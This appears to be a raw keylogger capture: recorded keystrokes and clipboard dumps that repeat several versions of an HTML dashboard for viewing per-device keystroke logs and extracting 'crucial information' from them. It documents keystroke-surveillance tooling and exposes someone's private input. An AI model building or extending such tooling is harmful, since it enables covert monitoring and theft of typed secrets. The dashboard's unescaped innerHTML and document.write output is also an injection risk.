                        const editorTextarea = document.getElementById('editor-textarea');
                        editorTextarea.value = `Crucial Information:\n\n${data.crucial_info}`;
                        document.getElementById('crucial-info').style.display = 'none';
                        document.getElementById('editor').style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function toggleMarkdownButton() {
            const textarea = document.getElementById('editor-textarea');
            const markdownButton = document.getElementById('markdown-button');
            markdownButton.style.display = textarea.value.trim() ? 'inline-block' : 'none';
        }

        // Attach event listener to detect changes in the textarea
        document.getElementById('editor-textarea').addEventListener('input', toggleMarkdownButton);

        function convertToMarkdown() {
            const textarea = document.getElementById('editor-textarea');
            const markdownOutput = textarea.value
                .split('\n') // Split the content into lines
                .map(line => `- ${line.trim()}`) // Prefix each line with `-`
                .join('\n'); // Join the lines with newline characters

            // Create a pop-up to display the Markdown
            const markdownPopup = window.open('', '_blank');
            markdownPopup.document.write('<pre>' + markdownOutput + '</pre>');
        }

        function downloadMarkdown() {
            const textarea = document.getElementById('editor-textarea');
            const markdownContent = textarea.value
                .split('\n')
                .map(line => `- ${line.trim()}`)
                .join('\n');

            const blob = new Blob([markdownContent], { type: 'text/markdown' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'analyzed_logs.md';
            link.click();
        }


    </script>
</body>

</html><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><191>

<ctrl><ctrl><191><shift>THIS IKey.backspace<shift>AKey.backspaceLAST COMMENTED LINE IS THE LATEST WORKING CODE , <shift>BELOW IS EXPERIMENTALKey.rightKey.rightKey.rightKey.rightKey.right
<ctrl>\x16<ctrl><ctrl>\x13<ctrl>\x12and when i click on analyze logs aomethings like the button displaying <shift>Analyzin Key.backspaceg with three dots ... and Key.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspacestarting with . then .. then ... agKey.backspaceKey.backspaceKey.backspace and agiKey.backspaceain . , until it analyzes the keystrokes ...<alt><tab><shift>

and also how is the markdownKey.backspacen file for the analyzed firKey.backspaceles being created i want to use ai to generate it ..<tab><tab>
<alt><tab>okok is theat hard to tnet the reason or something sakdjf;laskdjf; ldaskjf;laksdj f;lsdkj<alt><tab><alt><tab><alt><tab><alt><tab><alt><alt><tab><alt><tab><tab><alt><tab><alt><tab><alt><tab><ctrl>\x01\x03[Clipboard] <!-- view_logs.html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="display-button" onclick="displayLogs()">Display Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const crucialInfoDiv = document.getElementById('crucial-info');
                        crucialInfoDiv.innerHTML = `<h2>Crucial Information:</h2><p>${data.crucial_info}</p>`;
                        crucialInfoDiv.style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
        .output-textarea {
            width: 100%;
            min-height: 300px;
            padding: 10px;
            margin-top: 20px;
            background-color: #333;
            color: white;
            border: 1px solid #555;
            border-radius: 5px;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <textarea id="output-textarea" class="output-textarea" readonly></textarea>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const outputTextarea = document.getElementById('output-textarea');
                        outputTextarea.value = data.crucial_info;
                        outputTextarea.focus();
                        outputTextarea.select();
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
        .text-editor {
            background-color: #333;
            color: white;
            padding: 10px;
            margin-top: 20px;
            border-radius: 5px;
        }
        .text-editor textarea {
            width: 100%;
            min-height: 200px;
            background-color: inherit;
            color: inherit;
            border: none;
            outline: none;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <div class="text-editor" id="editor">
        <textarea id="editor-textarea" placeholder="Generated Output"></textarea>
    </div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const editorTextarea = document.getElementById('editor-textarea');
                        editorTextarea.value = `Crucial Information:\n\n${data.crucial_info}`;
                        document.getElementById('crucial-info').style.display = 'none';
                        document.getElementById('editor').style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html>
 -->

<!-- THIS LAST COMMENTED LINE IS THE LATEST WORKING CODE , BELOW IS EXPERIMENTAL -->

<!-- view_logs.html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="display-button" onclick="displayLogs()">Display Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const crucialInfoDiv = document.getElementById('crucial-info');
                        crucialInfoDiv.innerHTML = `<h2>Crucial Information:</h2><p>${data.crucial_info}</p>`;
                        crucialInfoDiv.style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
        .output-textarea {
            width: 100%;
            min-height: 300px;
            padding: 10px;
            margin-top: 20px;
            background-color: #333;
            color: white;
            border: 1px solid #555;
            border-radius: 5px;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <textarea id="output-textarea" class="output-textarea" readonly></textarea>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const outputTextarea = document.getElementById('output-textarea');
                        outputTextarea.value = data.crucial_info;
                        outputTextarea.focus();
                        outputTextarea.select();
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }

        h1 {
            color: yellowgreen;
        }

        .log-container {
            display: flex;
            flex-wrap: wrap;
        }

        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }

        .log-item {
            word-wrap: break-word;
        }

        .reset-button,
        .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }

        .analyze-button {
            background-color: blue;
        }

        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }

        .text-editor {
            background-color: #333;
            color: white;
            padding: 10px;
            margin-top: 20px;
            border-radius: 5px;
        }

        .text-editor textarea {
            width: 100%;
            min-height: 200px;
            background-color: inherit;
            color: inherit;
            border: none;
            outline: none;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>

<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
        <div class="log-column">
            <h2>Device: {{ device }}</h2>
            {% for log in logs %}
            <div class="log-item">{{ log }}</div>
            {% endfor %}
        </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>
    <button id="markdown-button" class="markdown-button" style="display: none;" onclick="convertToMarkdown()">Convert to
        Markdown</button>


    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <div class="text-editor" id="editor">
        <textarea id="editor-textarea" placeholder="Generated Output"></textarea>
    </div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const editorTextarea = document.getElementById('editor-textarea');
                        editorTextarea.value = `Crucial Information:\n\n${data.crucial_info}`;
                        document.getElementById('crucial-info').style.display = 'none';
                        document.getElementById('editor').style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function toggleMarkdownButton() {
            const textarea = document.getElementById('editor-textarea');
            const markdownButton = document.getElementById('markdown-button');
            markdownButton.style.display = textarea.value.trim() ? 'inline-block' : 'none';
        }

        // Attach event listener to detect changes in the textarea
        document.getElementById('editor-textarea').addEventListener('input', toggleMarkdownButton);

        function convertToMarkdown() {
            const textarea = document.getElementById('editor-textarea');
            const markdownOutput = textarea.value
                .split('\n') // Split the content into lines
                .map(line => `- ${line.trim()}`) // Prefix each line with `-`
                .join('\n'); // Join the lines with newline characters

            // Create a pop-up to display the Markdown
            const markdownPopup = window.open('', '_blank');
            markdownPopup.document.write('<pre>' + markdownOutput + '</pre>');
        }

        function downloadMarkdown() {
            const textarea = document.getElementById('editor-textarea');
            const markdownContent = textarea.value
                .split('\n')
                .map(line => `- ${line.trim()}`)
                .join('\n');

            const blob = new Blob([markdownContent], { type: 'text/markdown' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'analyzed_logs.md';
            link.click();
        }


    </script>
</body>

</html><alt><tab><alt><tab><ctrl>\x03Key.esc[Clipboard] <!-- view_logs.html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="display-button" onclick="displayLogs()">Display Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const crucialInfoDiv = document.getElementById('crucial-info');
                        crucialInfoDiv.innerHTML = `<h2>Crucial Information:</h2><p>${data.crucial_info}</p>`;
                        crucialInfoDiv.style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
        .output-textarea {
            width: 100%;
            min-height: 300px;
            padding: 10px;
            margin-top: 20px;
            background-color: #333;
            color: white;
            border: 1px solid #555;
            border-radius: 5px;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <textarea id="output-textarea" class="output-textarea" readonly></textarea>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const outputTextarea = document.getElementById('output-textarea');
                        outputTextarea.value = data.crucial_info;
                        outputTextarea.focus();
                        outputTextarea.select();
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
        .text-editor {
            background-color: #333;
            color: white;
            padding: 10px;
            margin-top: 20px;
            border-radius: 5px;
        }
        .text-editor textarea {
            width: 100%;
            min-height: 200px;
            background-color: inherit;
            color: inherit;
            border: none;
            outline: none;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <div class="text-editor" id="editor">
        <textarea id="editor-textarea" placeholder="Generated Output"></textarea>
    </div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const editorTextarea = document.getElementById('editor-textarea');
                        editorTextarea.value = `Crucial Information:\n\n${data.crucial_info}`;
                        document.getElementById('crucial-info').style.display = 'none';
                        document.getElementById('editor').style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html>
 -->

<!-- THIS LAST COMMENTED LINE IS THE LATEST WORKING CODE , BELOW IS EXPERIMENTAL -->

<!-- view_logs.html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="display-button" onclick="displayLogs()">Display Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const crucialInfoDiv = document.getElementById('crucial-info');
                        crucialInfoDiv.innerHTML = `<h2>Crucial Information:</h2><p>${data.crucial_info}</p>`;
                        crucialInfoDiv.style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
        .output-textarea {
            width: 100%;
            min-height: 300px;
            padding: 10px;
            margin-top: 20px;
            background-color: #333;
            color: white;
            border: 1px solid #555;
            border-radius: 5px;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <textarea id="output-textarea" class="output-textarea" readonly></textarea>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
